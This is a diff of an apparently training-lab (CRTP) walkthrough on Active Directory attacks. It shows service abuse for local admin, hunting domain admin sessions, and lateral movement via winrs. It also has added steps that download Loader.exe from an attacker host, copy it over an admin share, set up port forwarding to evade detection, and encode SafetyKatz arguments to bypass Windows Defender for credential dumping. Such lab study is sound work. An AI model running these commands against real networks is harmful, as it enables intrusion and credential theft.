@@ -60,9 +60,8 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 ```
 
 ![Result](/img/crtp/result2.png){: width="972" height="589" }
-_Invoke-AllChecks_
+_Now, our user is a local admin !_
 
-Now, our user is a local admin !
 
 ## Step 2: Identify Machines with Local Admin Access
 
@@ -76,8 +75,9 @@ After gaining local admin rights on one machine, identifying other machines wher
 Find-PSRemotingLocalAdminAccess
 ```
 ![Result](/img/crtp/result3.png){: width="972" height="589" }
+_studentx has administrative access on dcorp-adminsrv and on the student machine_
 
-We can connect to the machine with local administrative access using winrs or powershell remoting.
+So, studentx has administrative access on **dcorp-adminsrv** and on the **student machine.** We can connect to the machine with local administrative access using winrs or powershell remoting.
 ### Using winrs
 ```bash
 winrs -r:dcorp-adminsrv cmd
@@ -96,15 +96,50 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 
 **Tools Used:** PowerView
 
-Even with local admin access on multiple machines, the ultimate goal is often to gain domain admin rights. Identifying where domain admin accounts have active sessions can provide an opportunity to steal their tokens and impersonate them, further escalating your privileges within the domain. So we need to send a request to the Domain Controller to retrieve all ComputerName and membership of the domain admin's group with an admin session.
+After gaining local admin access on multiple machines, the next objective is often to escalate to **domain admin** privileges. Identifying machines where domain admin accounts are actively logged in provides an opportunity to steal their tokens and elevate privileges within the domain.
 
 ### Finding Domain User Locations
+To identify machines where domain admin sessions are active, we can query the Domain Controller for information on ComputerNames and membership of the domain admin group with active sessions.
 ```bash
 Find-DomainUserLocation
 ```
 ![Result](/img/crtp/result6.png){: width="972" height="589" }
+_There is a domain admin session on dcorp-mgmt server!_
 
-Now, we can abuse this using winrs or PowerShell Remoting!
+This information allows us to potentially exploit these sessions using techniques like winrs or PowerShell Remoting.
 
-**Abuse using winrs**
+## Step 4: Extract Credential
+
+**Tools Used:** SafetyKatz.exe
+
+### **Abuse using winrs**
+First, we check if we can execute commands on dcorp-mgmt and confirm if the winrm port is open:
+
 ![Result](/img/crtp/result7.png){: width="972" height="589" }
+
+Now, our objective is to extract credentials using SafetyKatz.exe on dcorp-mgmt. To achieve this covertly, we'll transfer **Loader.exe** from dcorp-ci to dcorp-mgmt to avoid downloading directly onto dcorp-mgmt.
+
+Downloading Loader.exe
+```bash
+iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
+
+Copying Loader.exe to dcorp-mgmt
+```bash
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+Setting up Port Forwarding
+To further evade detection on dcorp-mgmt, we establish port forwarding using winrs. 
+It's important to use $null for output redirection to avoid issues with command execution.
+```bash
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 
+listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+```
+
+Additional Considerations
+- Encoded Arguments: To bypass Windows Defender on dcorp-mgmt, encode arguments passed to Loader.exe for commands like sekurlsa::ekeys.
+
+Note that Windows Defender on dcorp-mgmt would detect SafetKatz execution even when used with Loader. To avoid that, let’s pass encoded arguments to the Loader. 
+
+First, run the below command on the student VM to generate encoded arguments for “sekurlsa::ekeys “ (not required to be run on the reverse shell):
